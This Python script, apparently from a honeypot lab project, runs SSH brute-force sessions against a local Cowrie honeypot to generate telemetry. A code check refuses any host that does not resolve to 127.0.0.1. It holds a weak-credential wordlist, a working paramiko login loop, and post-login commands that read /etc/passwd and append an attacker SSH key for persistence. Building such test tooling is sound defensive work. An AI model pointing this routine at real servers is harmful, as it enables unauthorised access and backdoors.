"""LAB-ONLY ATTACK TOOL. Do not point this at anything but the local lab honeypot.

Per CLAUDE.md's safety constraints: the testbed is lab-internal only, and attack tooling runs
only against containers in this compose project, validated against an allowlist before firing.
This script enforces that in code, not just in this comment: `check_target` resolves the
requested host and refuses to proceed unless it resolves to 127.0.0.1, so a hostname that
points elsewhere is refused too. Never remove or bypass that check to point this at a real host.

SSH brute-force against the LOCAL Cowrie honeypot (127.0.0.1:2222), to generate real honeypot
telemetry. It only ever uses a tiny built-in wordlist of common weak credentials (no real
credentials, no credentials from any real system).

    python scripts/attack_honeypot.py                       # 3 brute-force sessions, then a "post-login" session
    python scripts/attack_honeypot.py --sessions 6 --attempts 8
"""

from __future__ import annotations

import argparse
import logging
import random
import socket
import sys
import time

ALLOWED_HOSTS = {"127.0.0.1"}
WORDLIST = [("root", "root"), ("root", "123456"), ("admin", "admin"), ("admin", "password"), ("ubuntu", "ubuntu"),
            ("pi", "raspberry"), ("test", "test"), ("user", "user"), ("root", "toor"), ("oracle", "oracle"),
            ("root", "admin123"), ("postgres", "postgres")]
# the only pairs the lab honeypot accepts (scripts/cowrie/setup.sh writes the same three into Cowrie's userdb)
ACCEPTED = [("root", "toor"), ("admin", "admin123"), ("ubuntu", "ubuntu")]
REJECTED = [c for c in WORDLIST if c not in ACCEPTED]
# what an intruder who got in typically tries: recon, then a persistence-flavoured probe (nothing is downloaded)
COMMANDS = ["uname -a", "id", "cat /etc/passwd", "ls -la /", "ps aux", "echo 'ssh-rsa AAAAB3demo attacker' >> ~/.ssh/authorized_keys"]


def check_target(host: str, port: int) -> str:
    try:
        addr = socket.gethostbyname(host)
    except OSError as e:
        raise SystemExit(f"refusing: cannot resolve {host!r} ({e})")
    if addr not in ALLOWED_HOSTS:
        raise SystemExit(f"refusing: {host!r} resolves to {addr}; this tool only attacks 127.0.0.1")
    if not 1 <= port <= 65535:
        raise SystemExit("refusing: bad port")
    return addr


def brute_force(addr: str, port: int, attempts: int, rng: random.Random, run_commands: bool) -> tuple[int, bool]:
    """Try ``attempts`` credentials. Commands mode ends with one accepted pair (the intruder finally gets in)."""
    import paramiko
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)
    tried, got_in = 0, False
    creds = rng.sample(REJECTED, min(max(attempts - 1, 0), len(REJECTED)))
    creds.append(rng.choice(ACCEPTED) if run_commands else rng.choice(REJECTED))
    for user, pw in creds:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        tried += 1
        try:
            c.connect(addr, port=port, username=user, password=pw, timeout=8, banner_timeout=8, auth_timeout=8,
                      allow_agent=False, look_for_keys=False)
        except paramiko.AuthenticationException:
            c.close()
            time.sleep(0.2)
            continue
        got_in = True
        if run_commands:
            sh = c.invoke_shell()
            time.sleep(0.5)
            for cmd in COMMANDS:
                sh.send(cmd + "\n")
                time.sleep(rng.uniform(0.6, 1.4))     # human-ish pacing so the session has a real duration
            sh.send("exit\n")
            time.sleep(0.5)
        c.close()
        break
    return tried, got_in


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=2222)
    ap.add_argument("--sessions", type=int, default=3, help="brute-force sessions that never get in")
    ap.add_argument("--attempts", type=int, default=6, help="max credential attempts per session")
    ap.add_argument("--seed", type=int, default=0)
    a = ap.parse_args()
    addr = check_target(a.host, a.port)
    rng = random.Random(a.seed)
    print(f"target {addr}:{a.port} (allowlisted)")
    for i in range(a.sessions):
        tried, _ = brute_force(addr, a.port, rng.randint(3, a.attempts), rng, run_commands=False)
        print(f"  brute-force session {i + 1}: {tried} attempts")
    tried, got_in = brute_force(addr, a.port, a.attempts, rng, run_commands=True)
    print(f"  final session: {tried} attempts, logged in={got_in}, ran {len(COMMANDS) if got_in else 0} commands")
    return 0


if __name__ == "__main__":
    sys.exit(main())
